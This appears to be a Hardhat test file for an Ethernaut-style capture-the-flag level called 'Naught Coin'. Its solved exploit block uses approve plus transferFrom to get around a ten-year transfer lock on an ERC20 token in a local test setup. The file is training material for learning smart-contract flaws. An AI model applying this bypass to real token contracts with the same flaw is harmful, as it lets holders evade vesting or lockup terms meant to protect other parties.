const { ethers } = require("hardhat");
const { expect } = require("chai");

/*

NaughtCoin is an ERC20 token and you're already holding all of them. The catch is that you'll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.

  Things that might help

- The ERC20 Spec
- The OpenZeppelin codebase

*/

describe("[Challenge] Naught Coin", function () {
  let deployer, attacker, spender;
  const INITIAL_ATTACKER_BALANCE = ethers.utils.parseEther("1000000");

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker, spender] = await ethers.getSigners();

    this.naughtCoin = await (
      await ethers.getContractFactory("NaughtCoin", deployer)
    ).deploy(attacker.address);

    const attackerBalance = await this.naughtCoin.balanceOf(attacker.address);

    expect(attackerBalance).to.eq(INITIAL_ATTACKER_BALANCE);
  });

  it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE */

    // approve and transferFrom on behalf of attacker
    await this.naughtCoin
      .connect(attacker)
      .approve(spender.address, INITIAL_ATTACKER_BALANCE);
    await this.naughtCoin
      .connect(spender)
      .transferFrom(
        attacker.address,
        spender.address,
        INITIAL_ATTACKER_BALANCE
      );
  });

  after(async function () {
    /** SUCCESS CONDITIONS */
    const attackerBalance = await this.naughtCoin.balanceOf(attacker.address);
    expect(attackerBalance).to.eq(ethers.utils.parseEther("0"));
  });
});
